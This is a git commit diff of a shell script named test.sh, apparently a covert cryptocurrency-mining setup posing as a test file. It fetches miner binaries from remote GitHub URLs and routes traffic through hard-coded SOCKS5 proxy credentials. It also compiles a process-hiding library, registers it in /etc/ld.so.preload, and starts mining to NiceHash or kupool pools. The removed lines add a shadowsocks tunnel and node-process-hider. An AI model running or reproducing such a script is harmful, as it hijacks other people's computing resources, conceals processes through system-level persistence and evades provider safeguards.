25fb4b03df8a82e37cbae0fb12167d381913a65e
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 16:28:10 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,19 +1,5 @@
 #!/bin/sh
-sleep 11m
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-apt update 
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
-wget https://github.com/christiarch/templates/raw/main/lba 
-chmod +x lba 
-npm i -g node-process-hider 
-
-ph add graftcp
-ph add bezzHash
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
+sleep 50m
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -21,9 +7,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 191.101.148.51:45786
-socks5_username = Selshindeparshuram2012
-socks5_password = V7p9BkV
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -33,24 +19,20 @@ sleep .2
 echo " "
 echo " "
 
-echo "******************************************************************"
+echo ""
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo "******************************************************************"
+echo ""
 
 echo " "
 echo " "
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
-
-apt -y install shadowsocks-libev rng-tools
-rngd -r /dev/urandom
-ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -59,4 +41,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --par=beam3 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --server ssl://beamv3.usa-west.nicehash.com --port 3387 --pass IhatePopUps --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --ocX
+./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-TEST)@ethash.kupool.com:443
